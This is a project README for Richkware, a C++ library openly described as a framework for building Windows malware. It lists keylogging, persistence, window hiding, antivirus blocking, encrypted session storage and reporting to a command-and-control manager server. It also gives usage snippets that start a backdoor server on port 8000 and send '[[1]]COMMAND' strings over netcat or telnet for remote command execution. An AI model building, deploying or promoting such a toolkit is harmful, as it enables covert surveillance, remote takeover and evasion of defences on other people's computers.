# Richkware

[![Build status](https://ci.appveyor.com/api/projects/status/1tn6vedeaq0v27ra?svg=true)](https://ci.appveyor.com/project/richkmeli/richkware)

Framework for building Windows malware, written in C++.

## Description

It's a library of network and OS functions, that you can use to create malware.
The composition of these functions permits the application 
to assume behaviors referable to the following types of malware:

- Virus
- Worms
- Bot
- Spyware
- Keylogger
- Scareware

## Related Projects

[Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server): Service for management of hosts where is present a malware developed using **Richkware** framework.

[Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client): Client of **Richkware-Manager-Server**, that obtains list of all hosts and is able to send commands to do at each of them.

![](http://richk.altervista.org/RichkwareDiagram.svg)

## Documentation

|              | EN                          | IT                     |
|--------------|:------------------------------:|:------------------:|
| Presentation | [PDF](http://richk.me/Richkware/doc/EN/Slide.pdf)  | [PDF](http://richk.me/Richkware/doc/IT/Slide.pdf)     |
| Report       | [PDF](http://richk.me/Richkware/doc/EN/Report.pdf) | [PDF](http://richk.me/Richkware/doc/IT/Relazione.pdf) |

## Functions

### Network

- **Server** (*network.h*): module for the management of a multi-thread server, that allow to receive commands from Internet([Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client) or console) according to the specific protocol.
    - **Protocol** (*protocol.h*):
        1. **Remotely command execution** (ID 1)
        2. (work in progress)
- **Network** (*network.h*):
    - **RawRequest**: send a request to a server;
    - **UploadInfoToRichkwareManagerServer**: send information to [Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)

### System

- **Storage** (*storage.h*):
    - **SaveSession** and **LoadSession**: save the application state(encrypted) to:
        - **Register** (SaveValueReg and LoadValueReg)
        - **File** (SaveValueToFile and LoadValueFromFile)
    - **Persistence**: install itself permanently in the system.
- **IsAdmin** and **RequestAdminPrivileges** (*richkware.h*): check and require administrator privileges;

- **StealthWindow** (*richkware.h*): hide applications;
- **OpenApp** (*richkware.h*): open arbitrary applications;
- **Keylogger** (*richkware.h*): stores in a file all pressed keys;
 - **BlockApps** e **UnBlockApps** (*blockApps.h*): block and unblock applications (antivirus, ...).

### Cryptography

- **Encrypt and Decrypt** (*crypto.h*): [RC4](https://en.wikipedia.org/wiki/RC4) (default), [Blowfish](https://en.wikipedia.org/wiki/Blowfish_(cipher)).
- **Encode and Decode** (*crypto.h*): [Base64](https://en.wikipedia.org/wiki/Base64) (defualt), [Hex](https://en.wikipedia.org/wiki/Hexadecimal#Transfer_encoding).

![](http://richk.altervista.org/RichkwareCryptographyDiagram.svg)

### Other

- **RandMouse** (*richkware.h*): move randomly the mouse cursor;
- **Hibernation** (*richkware.h*): hibernate system.

## Requirements
These are the base requirements to build and use Richkware:

- Make or CMake
- [MinGW](http://www.mingw.org/)

## Get Started
Open main.cpp, and create instance of Richkware.
### With [Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)
if you deployed [RMS](https://github.com/richkmeli/Richkware-Manager-Server), you could use:

        int main() {
               Richkware richkware("Richk","DefaultPassword","192.168.99.100", "8080", "userAssociated");
                ...
                return 0;
            }
        
that get secure key from Richkware-Manager-Server and set it as encryption key.
DefaultPass is used as temporary encryption key to ensure a safety communication with RMS and if this app cannot reach the RMS, then it will use DefaultPass as encryption key.


### Without [Richkware-Manager-Server](https://github.com/richkmeli/Richkware-Manager-Server)

Else, if you didn't deploy [RMS](https://github.com/richkmeli/Richkware-Manager-Server), you could use: 
         
     Richkware richkware("Richk","richktest");
         
 it uses "richktest" as encryption key.
     


## Compile

After **main.cpp** implementation, you can compile as follows.

### Using MinGW for Windows or MinGW cross compiler for Linux build environment

	make

### Using Microsoft C++ compiler (Visual Studio)
- C/C++ > Preprocessor > Preprocessor Definitions, add "\_CRT\_SECURE\_NO\_WARNINGS" 
- Linker > Input > Additional Dependencies, add "Ws2_32.lib"

## Examples of usage

### Remotely Command Execution

Call function **StartServer** in the main, it starts server on port 8000.

	int main () {
	    ...
		richkware.network.server.Start("8000");
        ...
	}

### Connect using [Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)
In all systems where the Java Virtual Machine is installed, you can use [Richkware-Manager-Client](https://github.com/richkmeli/Richkware-Manager-Client)

### Connect using terminal in Unix systems

In Unix systems, you can use **netcat**.

	nc <serverName> 8000
	
after the answer from the server about establishment of connection, write:
    
    [[1]]COMMAND
    
where COMMAND is the command to execute to the pc where server is running.

### Connect using terminal in Windows

In Windows, you can use **telnet**.

	telnet <serverName> 8000

after the answer from the server about establishment of connection, write:
    
    [[1]]COMMAND
    
where COMMAND is the command to execute to the pc where server is running.
